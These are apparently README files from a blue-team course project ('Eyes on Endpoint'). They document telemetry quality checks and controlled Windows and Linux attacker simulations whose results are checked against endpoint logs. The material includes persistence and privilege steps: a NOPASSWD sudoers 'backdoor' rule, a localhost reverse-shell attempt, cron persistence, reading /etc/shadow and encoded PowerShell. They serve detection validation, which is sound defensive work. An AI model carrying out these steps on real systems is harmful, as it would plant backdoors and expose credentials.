For example, an attacker who obtains SSH access and executes reconnaissance commands may generate authentication evidence in `auth.log` and corresponding process execution events in `audit.log`.

### syslog Telemetry

The script parses system and service activity including:

- Service start events
- Service stop events
- Service failures
- Error conditions
- Critical conditions
- Fatal errors
- Segmentation faults
- Other system activity

This telemetry can help identify service disruption, system failures, and attacker attempts to disable security or business services.

### Normalized Event Format

Events from different Linux log sources are converted into a consistent structure.

Common fields include:

- `timestamp`
- `hostname`
- `platform`
- `source_type`
- `event_category`
- `raw_message`

Additional fields are included depending on the event type, such as:

- `user`
- `source_ip`
- `result`
- `auth_method`
- `command`
- `executable`
- `command_line`
- `path`
- `syscall`
- `destination`
- `service`
- `action`
- `audit_key`

All timestamps are normalized to **ISO 8601 UTC**.

Example:

```json
{
  "timestamp": "2026-08-09T10:15:32Z",
  "hostname": "billing-srv-01",
  "platform": "Linux",
  "source_type": "auth.log",
  "event_category": "ssh_login_success",
  "user": "analyst",
  "source_ip": "10.10.10.50",
  "result": "success"
}

---

# 8 – Linux Telemetry Quality Gate

## Objective

Evaluate the quality of exported Linux telemetry before it is handed to a SOC analyst.

Exporting logs is only the first step. Poor quality telemetry can prevent analysts from detecting attacker activity, reconstructing timelines or performing accurate incident response.

This task validates the Linux telemetry produced in **Task 7** and measures whether it is complete, continuous and useful for investigation.

---

## Real-world Purpose

SOC teams ingest millions of events every day.

A successful export does **not** guarantee that telemetry is useful.

Common problems include:

- missing timestamps
- missing hostname information
- missing command lines
- SSH events without source IP addresses
- auditd events without file paths
- large gaps in logging
- missing event categories

Before forwarding telemetry to a SIEM or another SOC team, quality must be verified.

This script acts as a **Quality Gate**.

---

## Input

```
linux_events_export.json
```

Generated by:

```
7-linux_export.sh
```

---

## Output

```
linux_telemetry_quality.json
```

---

## Quality Checks

The script evaluates five major areas.

### 1. Event Distribution

Calculates:

- count per event category
- count per source type
- percentage of total events

Example:

```
SSH Login Success     214
SSH Login Failure      18
execve               1402
sudo                  523
```

---

### 2. Time Coverage

Measures logging continuity.

Reports:

- events per hour
- hours containing events
- hours without events

Example:

```
24 hours observed

Hours with events:
24

Hours without events:
0
```

---

### 3. Gap Detection

Detects telemetry gaps longer than 30 minutes.

Example:

```
Gap detected

Start:
2026-08-09T03:11:14Z

End:
2026-08-09T04:02:55Z

Duration:
51 minutes
```

---

### 4. Field Completeness

Measures whether important fields are populated.

Common fields:

- timestamp
- hostname
- source_type
- event_category

Specific fields:

### execve

Checks:

```
command_line
```

### SSH

Checks:

```
source_ip
user
```

### auditd file events

Checks:

```
path
operation
key
```

---

### 5. Quality Score

Computes a weighted score between **0 and 100**.

Assessment:

```
85–100  -> good

65–84   -> acceptable

0–64    -> poor
```

---

## Scoring Weights

| Area | Weight |
|-------|---------|
| Common fields | 20% |
| execve command line | 20% |
| SSH source IP | 15% |
| SSH user | 10% |
| auditd file events | 15% |
| Time coverage | 10% |
| Gap continuity | 10% |

---

## Script Workflow

1. Validate input JSON
2. Count total events
3. Build event distribution
4. Build source distribution
5. Calculate events per hour
6. Detect logging gaps
7. Measure field completeness
8. Calculate weighted quality score
9. Generate JSON report
10. Validate generated JSON

---

## Example Output

```
$ sudo ./8-linux_telemetry_quality.sh

[*] Analyzing linux_events_export.json...

[*] Event Distribution...
[*] Time Coverage...
[*] Gap Detection...
[*] Field Completeness...
[*] Quality Score...

Total events: 2022

Hours with events: 24/24

No gaps detected

execve command_line completeness: 100%

SSH source_ip completeness: 100%

auditd file path completeness: 100%

Quality score: 96.1% (good)

Report saved to:
linux_telemetry_quality.json
```

---

## Files

```
8-linux_telemetry_quality.sh
linux_telemetry_quality.json
README.md
```

---

## Safety

This script is **read-only**.

It does **not**:

- modify logs
- modify auditd
- modify rsyslog
- modify journald
- change permissions
- delete telemetry
- alter system configuration

It only reads:

```
linux_events_export.json
```

and produces:

```
linux_telemetry_quality.json
```

---

## Skills Demonstrated

- Linux Security Monitoring
- Bash Scripting
- jq JSON Processing
- Telemetry Quality Assessment
- auditd Analysis
- SSH Event Validation
- Log Completeness Validation
- Time-Series Analysis
- SOC Telemetry Engineering
- Detection Engineering
- Incident Response Preparation

---

## MITRE ATT&CK Relevance

High-quality telemetry supports investigation of techniques including:

- T1059 – Command and Scripting Interpreter
- T1053 – Scheduled Task
- T1078 – Valid Accounts
- T1548 – Abuse Elevation Control Mechanism
- T1021 – Remote Services (SSH)
- T1105 – Ingress Tool Transfer
- T1106 – Native API
- T1562 – Impair Defenses

---

## Why This Matters

Large organizations rarely trust raw telemetry.

Before logs are forwarded into a SIEM or delivered to an external SOC, automated quality gates verify that telemetry is:

- complete
- consistent
- searchable
- investigation-ready

Without these checks, analysts may miss attacker activity because critical fields such as command lines, source IP addresses or audit paths were never collected.

---

# Task 8 — Linux Telemetry Quality Gate

## Project

**2x02 - Eyes on Endpoint**

This task evaluates the quality of Linux telemetry collected in the previous stage of the project. The script reads `linux_events_export.json` and generates a structured report in `linux_telemetry_quality.json`.

The assessment is read-only with respect to system telemetry: it analyzes the exported JSON and writes a quality report only.

## Objective

The goal is to verify whether the collected Linux telemetry is sufficiently complete, continuous, and useful for security monitoring and investigation.

The quality gate evaluates:

- event distribution;
- time coverage;
- telemetry gaps;
- field completeness;
- overall weighted quality score.

## Script

```text
8-linux_telemetry_quality.sh
```

### Input

```text
linux_events_export.json
```

### Output

```text
linux_telemetry_quality.json
```

## Requirements

The script requires:

```bash
jq
date
awk
sort
head
tail
```

## Usage

Make the script executable:

```bash
chmod +x 8-linux_telemetry_quality.sh
```

Run it from the directory containing `linux_events_export.json`:

```bash
./8-linux_telemetry_quality.sh
```

If Task 7 has not yet generated the input file:

```bash
sudo ./7-linux_export.sh
```

## Input Validation

Before analysis, the script verifies that:

1. `linux_events_export.json` exists;
2. the file contains valid JSON;
3. the export contains telemetry events.

If no events are available, the report is marked `poor` with a score of `0`.

## Quality Dimensions

### 1. Event Distribution

The script counts events by:

- `event_category`;
- `source_type`.

For each group, it calculates the total count and percentage of all events.

### 2. Time Coverage

The script determines the observation window from metadata when available. If metadata is missing, it uses the earliest and latest event timestamps.

The window is divided into one-hour buckets and the script calculates:

- total hours;
- hours with events;
- hours without events;
- events per hour;
- percentage of hours containing telemetry.

Formula:

```text
Time Coverage % = Hours With Events / Total Hours × 100
```

### 3. Gap Detection

All timestamps are sorted chronologically. A significant telemetry gap is any period longer than:

```text
30 minutes
```

The report records:

- number of gaps;
- start and end of each gap;
- duration in minutes;
- largest observed gap.

The script also checks for an initial gap before the first event and a final gap after the last event.

### 4. Field Completeness

#### Common fields

Every event is expected to contain:

```text
timestamp
hostname
source_type
event_category
```

#### execve events

For `event_category == "execve"`, the script checks:

```text
command_line
```

#### SSH events

For `ssh_login_success` and `ssh_login_failure`, the script checks:

```text
source_ip
user
```

A source IP equal to `-` is treated as incomplete.

#### auditd file events

For events where:

```text
source_type == "auditd"
event_category == "file_access"
```

the script checks:

```text
path
operation
key
```

It also accepts the aliases:

```text
syscall   -> operation
audit_key -> key
```

The auditd file-event completeness score is the average of path, operation, and key completeness.

## Weighted Quality Score

The final score ranges from `0` to `100`.

| Quality Dimension | Weight |
|---|---:|
| Common field completeness | 20 |
| execve command-line completeness | 20 |
| SSH source IP completeness | 15 |
| SSH user completeness | 10 |
| auditd file-event completeness | 15 |
| Time coverage | 10 |
| Gap continuity | 10 |
| **Total** | **100** |

## Gap Continuity Score

| Largest Gap | Score |
|---|---:|
| ≤ 30 minutes | 100 |
| ≤ 60 minutes | 80 |
| ≤ 120 minutes | 60 |
| ≤ 240 minutes | 40 |
| > 240 minutes | 20 |

## Final Assessment

| Score | Assessment |
|---|---|
| `>= 85` | `good` |
| `>= 65` and `< 85` | `acceptable` |
| `< 65` | `poor` |

## Output Structure

The generated JSON contains:

```json
{
  "metadata": {},
  "total_events": 0,
  "event_distribution": {},
  "time_coverage": {},
  "gap_detection": {},
  "field_completeness": {},
  "quality_score": {}
}
```

### Main sections

`metadata` contains the generation time, source file, analysis window, and gap threshold.

`event_distribution` contains statistics by event category and source type.

`time_coverage` contains total hours, hours with and without events, coverage percentage, and events per hour.

`gap_detection` contains the number of gaps, the largest gap, and detailed gap records.

`field_completeness` contains results for common fields, execve, SSH, and auditd file events.

`quality_score` contains the final score and assessment.

## Useful Commands

Validate the generated report:

```bash
jq empty linux_telemetry_quality.json
```

Pretty-print it:

```bash
jq . linux_telemetry_quality.json
```

Show only the final score:

```bash
jq '.quality_score' linux_telemetry_quality.json
```

Show detected gaps:

```bash
jq '.gap_detection' linux_telemetry_quality.json
```

Show field completeness:

```bash
jq '.field_completeness' linux_telemetry_quality.json
```

Show hourly telemetry coverage:

```bash
jq '.time_coverage.events_per_hour' linux_telemetry_quality.json
```

## Security Value

A high event count does not automatically mean that telemetry is useful. A SOC analyst also needs to know whether important fields are populated, whether the expected monitoring window is covered, whether collection gaps exist, and whether investigation-critical information such as command lines, usernames, IP addresses, file paths, operations, and audit keys is available.

This quality gate provides a repeatable way to assess telemetry before it is used for detection engineering or incident investigation.

## Author

**Pedro Cabral**

Project: `2x02 - Eyes on Endpoint`  
Task: `8 - Linux Telemetry Quality Gate`

# 2x02 - Eyes on Endpoint
## Tasks 9 & 10 — Windows Attacker Simulation and Detection Proof

This project demonstrates a complete **attack-simulation → telemetry collection → detection-validation** workflow on Windows.

It contains two PowerShell scripts:

- `9-windows_attack_sim.ps1` — runs a controlled, harmless attacker simulation and records precise ground truth.
- `10-windows_detection_proof.ps1` — correlates that ground truth with Windows Security, Sysmon, and PowerShell telemetry to prove what was detected.

The goal is not exploitation. The goal is to validate whether endpoint telemetry is configured well enough to observe common attacker-like behaviours.

---

# 1. Project Workflow

```text
9-windows_attack_sim.ps1
        |
        |  Executes 6 controlled actions
        v
windows_attack_log.json
        |
        |  Ground truth: timestamp, action, expected source,
        |  MITRE ATT&CK technique, contextual details
        v
10-windows_detection_proof.ps1
        |
        |  Queries Security, Sysmon and PowerShell logs
        |  around each recorded timestamp
        v
windows_detection_matrix.json
        |
        v
Detection matrix:
Captured / Missed
Full / Partial / Missing detail
```

---

# 2. Script 1 — `9-windows_attack_sim.ps1`

## Purpose

`9-windows_attack_sim.ps1` executes a controlled Windows attacker simulation, records exact ground-truth information for each action, and removes the test artifacts afterwards.

The script is designed for defensive-security labs and telemetry validation.

## Controlled Actions

| # | Action | Expected Telemetry | MITRE ATT&CK |
|---|---|---|---|
| 1 | Create temporary `support_update` account | Security 4720, Sysmon 1 | T1136 — Create Account |
| 2 | Add account to Administrators | Security 4732, Sysmon 1 | T1098 — Account Manipulation |
| 3 | Run harmless encoded PowerShell | Sysmon 1, Security 4688, PowerShell 4104 | T1059.001 / T1027 |
| 4 | Create a scheduled task | Security 4698, Sysmon 1 | T1053.005 — Scheduled Task |
| 5 | Initiate outbound TCP connection | Sysmon 3 | T1071 — Application Layer Protocol |
| 6 | Create a harmless Startup-folder file | Sysmon 11 | T1547.001 — Startup Folder |

## Safety

The simulation intentionally uses harmless actions:

- no destructive commands;
- no credential theft;
- no external payload downloads;
- no persistence left behind after successful cleanup;
- temporary user, scheduled task, and Startup file are removed automatically.

The encoded PowerShell payload only prints:

```powershell
Write-Host "C2 beacon"
```

The network test uses `1.1.1.1:443` only to generate outbound network telemetry.

## Domain Controller Compatibility

The script works on both Windows member servers/workstations and Active Directory Domain Controllers. A Domain Controller has no normal local SAM user database, so the script detects the host role automatically. On a Domain Controller it creates a temporary **domain account**; on a member server/workstation it creates a temporary **local account**.

## Requirements

Run from an elevated PowerShell session. Recommended telemetry configuration:

- Windows Security auditing enabled;
- Sysmon installed and running;
- process creation logging enabled;
- PowerShell Script Block Logging enabled.

## Usage

```powershell
.\9-windows_attack_sim.ps1
```

## Output

The script creates:

```text
windows_attack_log.json
```

The file contains ground truth for every simulated action, including action number, description, UTC timestamp, expected telemetry source, MITRE ATT&CK technique, execution status, and contextual details used later for correlation.

## Cleanup

After the ground-truth report is written and validated, the script attempts to remove the Startup file, scheduled task, Administrators-group membership, and temporary user account. Successful cleanup is reported as `[CLEAN]`. Cleanup warnings cause the script to exit with a non-zero status so they are not silently ignored.

---

# 3. Script 2 — `10-windows_detection_proof.ps1`

## Purpose

`10-windows_detection_proof.ps1` proves whether the actions generated by Task 9 were actually captured by the Windows telemetry stack.

It loads `windows_attack_log.json`, searches the relevant Windows Event Logs around each recorded action timestamp, correlates candidate events using contextual fields, and creates a detection matrix.

## Telemetry Sources

### Windows Security Log

Relevant Event IDs include:

- `4720` — User account created;
- `4732` — Member added to a local security-enabled group;
- `4688` — New process created;
- `4698` — Scheduled task created.

### Sysmon

Log path:

```text
Microsoft-Windows-Sysmon/Operational
```

Relevant Event IDs:

- `1` — Process creation;
- `3` — Network connection;
- `11` — File creation.

### PowerShell

Log path:

```text
Microsoft-Windows-PowerShell/Operational
```

Relevant Event ID:

- `4104` — Script Block Logging.

---

# 4. Detection Correlation

The script does not simply search for an Event ID. For each ground-truth action, it opens a time window around the recorded timestamp:

```text
timestamp - 30 seconds
timestamp + 30 seconds
```

It then uses contextual information from Task 9 to verify that a candidate event really belongs to the simulation. Examples include account name, target group, encoded command, scheduled-task name, destination IP/port, and exact target file path.

This reduces false correlations caused by unrelated events occurring in the same time window.

---

# 5. Detail Classification

Each detected event is classified according to the completeness of important fields:

- **Full** — all required fields for that source/Event ID are present.
- **Partial** — the event was captured, but one or more expected fields are missing.
- **Missing** — the event exists, but none of the required fields are populated.
- **None** — no matching event was found.

## Required Fields by Event

| Source | Event ID | Required fields |
|---|---:|---|
| Security | 4720 | `TargetUserName`, `SubjectUserName` |
| Security | 4732 | `MemberName`, `TargetUserName` |
| Security | 4688 | `NewProcessName`, `CommandLine` |
| Security | 4698 | `TaskName`, `SubjectUserName` |
| Sysmon | 1 | `Image`, `CommandLine`, `User` |
| Sysmon | 3 | `DestinationIp`, `DestinationPort`, `Image` |
| Sysmon | 11 | `TargetFilename`, `Image` |
| PowerShell | 4104 | `ScriptBlockText` |

---

# 6. Usage

Task 10 should be run on the **same Windows host** used for Task 9.

Run Task 9 first:

```powershell
.\9-windows_attack_sim.ps1
```

Confirm the ground-truth file exists:

```powershell
Test-Path .\windows_attack_log.json
```

Then run Task 10:

```powershell
.\10-windows_detection_proof.ps1
```

The default correlation window is 30 seconds. A custom window can be supplied:

```powershell
.\10-windows_detection_proof.ps1 -WindowSeconds 60
```

Custom input and output paths are also supported:

```powershell
.\10-windows_detection_proof.ps1 `
    -GroundTruthFile ".\windows_attack_log.json" `
    -OutputFile ".\windows_detection_matrix.json" `
    -WindowSeconds 30
```

---

# 7. Detection Output

The script prints a console matrix similar to:

```text
Action                     Source         Event ID   Detail    Status
------                     ------         --------   ------    ------
Create user                Security       4720       Full      [CAPTURED]
                           Sysmon          1          Full      [CAPTURED]
Add to Administrators      Security       4732       Full      [CAPTURED]
Encoded PowerShell         Sysmon          1          Full      [CAPTURED]
                           PS ScriptBlock  4104       Full      [CAPTURED]
                           Security        4688       Partial   [CAPTURED]
Outbound connection        Sysmon          3          Full      [CAPTURED]
```

A summary is also printed, for example:

```text
Actions: 6 | Captured: 6/6 (100%) | Multi-source: 4
```

---

# 8. JSON Detection Report

Task 10 generates:

```text
windows_detection_matrix.json
```

The report contains generation timestamp, source ground-truth file, correlation window, number of simulated actions, captured actions, capture percentage, number of multi-source actions, per-source detection results, Event IDs, detail classification, selected key fields, and matched event timestamps.

---

# 9. Telemetry Prerequisites

Detection quality depends directly on endpoint logging configuration.

## Security Event 4688

Process creation auditing should be enabled. To obtain command-line details, enable **Include command line in process creation events**.

## Security Events 4720 / 4732

Relevant Account Management auditing must be enabled.

## Security Event 4698

Scheduled-task auditing must be available.

## Sysmon

Sysmon must be installed and configured to collect at least:

```text
Event ID 1  - Process Create
Event ID 3  - Network Connection
Event ID 11 - File Create
```

## PowerShell 4104

PowerShell Script Block Logging must be enabled.

If a source is not configured correctly, Task 10 may legitimately report `[MISSED]`. That result is useful because it demonstrates a telemetry or audit-policy gap.

---

# 10. Recommended Execution Order

```powershell
# 1. Open PowerShell as Administrator

# 2. Change to the project directory
cd C:\path\to\project

# 3. Run controlled simulation
.\9-windows_attack_sim.ps1

# 4. Confirm ground truth
Get-Content .\windows_attack_log.json

# 5. Run detection validation
.\10-windows_detection_proof.ps1

# 6. Review detection matrix
Get-Content .\windows_detection_matrix.json
```

---

# 11. Expected Files

```text
project/
|
|-- 9-windows_attack_sim.ps1
|-- 10-windows_detection_proof.ps1
|-- windows_attack_log.json
|-- windows_detection_matrix.json
`-- README.md
```

---

# 12. MITRE ATT&CK Coverage

| Technique | Name | Simulated Behaviour |
|---|---|---|
| T1136 | Create Account | Temporary user creation |
| T1098 | Account Manipulation | Administrators membership |
| T1059.001 | PowerShell | Encoded PowerShell execution |
| T1027 | Obfuscated/Compressed Files and Information | Encoded command |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Scheduled task creation |
| T1071 | Application Layer Protocol | Controlled outbound connection |
| T1547.001 | Registry Run Keys / Startup Folder | Startup-directory file |

---

# 13. Defensive Security Value

Together, the two scripts validate several SOC and detection-engineering concepts:

- attacker behaviour simulation;
- telemetry generation;
- ground-truth recording;
- Windows Event Log analysis;
- Sysmon validation;
- PowerShell logging validation;
- multi-source correlation;
- detection engineering;
- contextual matching to reduce false positives;
- ATT&CK technique mapping;
- visibility-gap identification.

The key question is not only whether Windows generated an event, but whether the SOC captured the behaviour, which source observed it, whether enough detail was available for investigation, and whether the same activity could be correlated across multiple telemetry sources.

---

# 14. Important Notes

- Run both scripts on the **same host**.
- Run Task 10 soon after Task 9 so relevant events do not age out or get overwritten.
- Use an elevated PowerShell session.
- A `[MISSED]` result does not automatically mean the script failed; it may indicate that the corresponding telemetry source or audit policy is not enabled.
- Task 9 writes ground truth **before cleanup**, ensuring the actions remain documented even though temporary artifacts are removed.
- The project is intended for authorized lab and defensive-security environments.

---

## Author

**Pedro Cabral**

Project: **2x02 - Eyes on Endpoint**

- **Task 9 — Windows Attacker Simulation**
- **Task 10 — Windows Detection Proof**

---

# Task 11 — Linux Attacker Simulation

## Project

**2x02 - Eyes on Endpoint**

Task 11 applies the same validation methodology used for Windows to a Linux endpoint.

The script `11-linux_attack_sim.sh` performs a controlled sequence of attacker-like actions, records precise timestamps and contextual information as **ground truth**, and then removes the artifacts created during the simulation.

The purpose is to validate whether Linux endpoint telemetry can capture behaviours that a SOC analyst or detection engineer would expect to observe.

---

## Goal

Execute six controlled attacker-like actions on the hardened Linux endpoint and generate:

```text
linux_attack_log.json
```

This JSON file provides the ground truth that can later be correlated against Linux telemetry such as `auditd`, authentication logs, process execution events, file-access events, cron activity, and network telemetry.

---

## Repository Location

```text
dlh-cyber_security/
└── blue_team/
    └── 2x02_eyes_on_endpoint/
        ├── 11-linux_attack_sim.sh
        └── linux_attack_log.json
```

---

## Requirements

The script should be executed on a Linux lab endpoint with:

- Bash
- `jq`
- `date`
- standard Linux account-management utilities
- root/sudo privileges

Check `jq` with:

```bash
jq --version
```

If necessary on Debian/Ubuntu:

```bash
sudo apt update
sudo apt install jq
```

The script must run as root because the simulation includes account creation, sudoers modification, cron persistence, and access to `/etc/shadow`.

---

## Controlled Simulation

The script executes six actions.

| # | Simulated action | Main artifact / behaviour |
|---|---|---|
| 1 | Create temporary user | `testattacker` |
| 2 | Modify sudoers | `/etc/sudoers.d/backdoor` |
| 3 | Execute binary from `/tmp` | `/tmp/suspicious_bin` |
| 4 | Attempt localhost reverse shell | `127.0.0.1:4444` |
| 5 | Establish cron persistence | `/etc/cron.d/persistence_test` |
| 6 | Access sensitive file | `/etc/shadow` |

Each action is timestamped so that later detection analysis can search the telemetry around the exact time at which the action occurred.

---

## Action 1 — Create User

The simulation creates:

```text
testattacker
```

This represents suspicious local-account creation.

Example command behaviour:

```bash
useradd testattacker
```

### MITRE ATT&CK

```text
T1136.001 — Create Account: Local Account
```

### Detection opportunities

Potential Linux telemetry includes:

- `auditd` user/account-management records
- authentication/account logs
- changes to `/etc/passwd`
- changes to `/etc/shadow`
- changes to `/etc/group`

---

## Action 2 — Modify Sudoers

The simulation creates a sudoers rule for the temporary account:

```text
/etc/sudoers.d/backdoor
```

with a rule equivalent to:

```text
testattacker ALL=(ALL) NOPASSWD:ALL
```

This simulates modification of privilege-escalation configuration.

### MITRE ATT&CK

```text
T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching
```

### Detection opportunities

Useful telemetry may include:

- file creation
- file modification
- audit events involving `/etc/sudoers.d/`
- process execution responsible for the change

---

## Action 3 — Execute from `/tmp`

A legitimate system binary is copied to:

```text
/tmp/suspicious_bin
```

and executed from `/tmp`.

This generates telemetry for execution from a temporary directory, a behaviour that can be useful in endpoint detection.

The current implementation uses a harmless binary such as:

```text
/usr/bin/true
```

copied to:

```text
/tmp/suspicious_bin
```

### Detection opportunities

Potential telemetry includes:

- `auditd` `execve`
- process execution
- executable path
- file creation in `/tmp`
- parent/child process information

---

## Action 4 — Localhost Reverse-Shell Attempt

The simulation attempts a Bash connection to:

```text
127.0.0.1:4444
```

The destination is deliberately restricted to **localhost**.

No external command-and-control infrastructure is contacted.

### Safety

```text
Destination: 127.0.0.1
Port:        4444
Scope:       localhost only
```

The connection is used only to generate attacker-like shell/network telemetry in the lab.

### MITRE ATT&CK

The script records the shell behaviour under:

```text
T1059.004 — Command and Scripting Interpreter: Unix Shell
```

### Detection opportunities

Possible telemetry includes:

- Bash execution
- shell command line
- network connection attempt
- destination IP
- destination port
- process/network correlation

---

## Action 5 — Cron Persistence

The simulation creates a harmless script:

```text
/tmp/beacon.sh
```

and a cron configuration:

```text
/etc/cron.d/persistence_test
```

The beacon itself performs no malicious activity.

Its purpose is to create a controlled persistence artifact that endpoint telemetry can observe.

### MITRE ATT&CK

```text
T1053.003 — Scheduled Task/Job: Cron
```

### Detection opportunities

Useful evidence may include:

- creation/modification of `/etc/cron.d/persistence_test`
- creation of `/tmp/beacon.sh`
- audit file events
- cron telemetry

---

## Action 6 — Access `/etc/shadow`

The final action reads:

```text
/etc/shadow
```

without displaying or storing its contents.

Conceptually:

```bash
cat /etc/shadow > /dev/null
```

The goal is to produce evidence of sensitive-file access without collecting credentials.

### MITRE ATT&CK

The script records this behaviour as:

```text
T1005 — Data from Local System
```

### Detection opportunities

Potential evidence includes:

- access to `/etc/shadow`
- `auditd` file-access events
- process responsible for the access
- UID/EUID information
- syscall information

---

## Safety Controls

This is a controlled defensive-security simulation.

The script is designed with the following restrictions:

- no destructive commands
- no external payload downloads
- no credential theft
- no exfiltration
- reverse-shell attempt restricted to `127.0.0.1`
- temporary test account
- harmless persistence payload
- automatic cleanup of created artifacts

Use it only on systems where you are authorized to perform security testing.

---

## Running the Script

Make the script executable:

```bash
chmod +x 11-linux_attack_sim.sh
```

Run it with sudo:

```bash
sudo ./11-linux_attack_sim.sh
```

Expected console structure:

```text
[*] Running Linux attacker simulation...
    [1/6] Creating user testattacker...               <timestamp>
    [2/6] Modifying sudoers...                        <timestamp>
    [3/6] Executing from /tmp...                      <timestamp>
    [4/6] Reverse shell attempt (localhost)...        <timestamp>
    [5/6] Cron persistence...                         <timestamp>
    [6/6] Accessing /etc/shadow...                    <timestamp>
[*] Cleaning up artifacts...                          [CLEAN]
Actions executed: 6
Ground truth saved to: linux_attack_log.json
```

---

## Ground Truth

The main output is:

```text
linux_attack_log.json
```

Ground truth is important because it records **what actually happened and when**.

Instead of searching logs blindly, the next detection-validation task can compare telemetry against known actions and timestamps.

The report contains information such as:

- hostname
- platform
- generation time
- action count
- action number
- description
- UTC timestamp
- expected detection source
- MITRE ATT&CK mapping
- execution status
- contextual details

Example conceptual structure:

```json
{
  "metadata": {
    "simulation": "MedDefense Linux Attacker Simulation",
    "hostname": "linux-endpoint",
    "platform": "Linux",
    "action_count": 6,
    "controlled_simulation": true
  },
  "actions": [
    {
      "action_number": 1,
      "description": "Created temporary local account testattacker",
      "timestamp": "2026-08-10T11:02:00Z",
      "expected_detection_source": [
        "auditd user/account management",
        "auth log"
      ],
      "mitre_attack": {
        "technique_id": "T1136.001",
        "technique_name": "Create Account: Local Account"
      },
      "status": "executed"
    }
  ]
}
```

---

## Inspecting the Ground Truth

Validate the generated JSON:

```bash
jq empty linux_attack_log.json
```

Pretty-print it:

```bash
jq . linux_attack_log.json
```

Show only the actions:

```bash
jq '.actions' linux_attack_log.json
```

Show action number, timestamp, and description:

```bash
jq -r '
    .actions[]
    | "\(.action_number) | \(.timestamp) | \(.description)"
' linux_attack_log.json
```

---

## Cleanup

After recording the ground truth, the script removes the artifacts created by the simulation.

These include:

```text
testattacker
/etc/sudoers.d/backdoor
/tmp/suspicious_bin
/tmp/beacon.sh
/etc/cron.d/persistence_test
```

Successful cleanup should produce:

```text
[CLEAN]
```

You can verify manually:

```bash
id testattacker
```

Expected:

```text
id: 'testattacker': no such user
```

Check the files:

```bash
sudo test -e /etc/sudoers.d/backdoor && echo "EXISTS" || echo "CLEAN"
sudo test -e /tmp/suspicious_bin && echo "EXISTS" || echo "CLEAN"
sudo test -e /tmp/beacon.sh && echo "EXISTS" || echo "CLEAN"
sudo test -e /etc/cron.d/persistence_test && echo "EXISTS" || echo "CLEAN"
```

All should report:

```text
CLEAN
```

---

## Troubleshooting — `coreutils: unknown program 'suspicious_bin'`

On some Linux distributions, copying `/usr/bin/id` to another filename and executing the copy can produce:

```text
coreutils: unknown program 'suspicious_bin'
```

For this lab, use a harmless standalone executable such as:

```bash
cp /usr/bin/true /tmp/suspicious_bin
chmod 0755 /tmp/suspicious_bin
/tmp/suspicious_bin
```

This still produces the intended execution-from-`/tmp` behaviour without relying on the copied `id` executable.

---

## Important Cleanup Note

If the script terminates unexpectedly before its normal cleanup stage, verify that the temporary artifacts were not left behind.

For example:

```bash
id testattacker
sudo ls -l /etc/sudoers.d/backdoor 2>/dev/null
```

Manual cleanup, if required:

```bash
sudo rm -f /etc/sudoers.d/backdoor
sudo rm -f /tmp/suspicious_bin
sudo rm -f /tmp/beacon.sh
sudo rm -f /etc/cron.d/persistence_test
sudo userdel -r testattacker 2>/dev/null || true
```

A robust implementation should also use an exit/error trap so cleanup occurs when an intermediate simulation step fails.

---

## Detection Validation Workflow

Task 11 establishes the Linux **ground truth**.

The intended workflow is:

```text
Controlled attacker-like actions
              |
              v
11-linux_attack_sim.sh
              |
              v
linux_attack_log.json
              |
              v
Linux telemetry
(auditd / auth / process / file / network / cron)
              |
              v
Detection correlation
              |
              v
Captured / Missed
Full / Partial detail
```

This makes it possible to answer important SOC questions:

- Was the attacker-like action captured?
- Which telemetry source detected it?
- Was the timestamp accurate enough for correlation?
- Was the command line captured?
- Was the responsible user recorded?
- Was the affected path captured?
- Was the destination IP/port visible?
- Are there gaps in the endpoint's Linux telemetry?

---

## SOC / Blue-Team Value

This task demonstrates practical skills in:

- Linux endpoint telemetry
- controlled adversary simulation
- detection engineering
- ground-truth generation
- `auditd` validation
- sensitive-file monitoring
- process execution monitoring
- persistence detection
- privilege-change monitoring
- network telemetry
- MITRE ATT&CK mapping
- detection-gap analysis

The important distinction is that the project does not only ask whether the simulation ran successfully.

It establishes a known sequence of actions so that the defensive controls can later prove whether those actions were observable.

---

## Related Tasks

```text
Task 9
Windows Attacker Simulation
        |
        v
windows_attack_log.json
        |
        v
Task 10
Windows Detection Proof


Task 11
Linux Attacker Simulation
        |
        v
linux_attack_log.json
        |
        v
Linux Detection Validation
```

This provides a consistent attack-and-detect methodology across both Windows and Linux endpoints.

---

## Author

**Pedro Cabral**

**Project:** 2x02 - Eyes on Endpoint  
**Task:** 11 - Linux Attacker Simulation

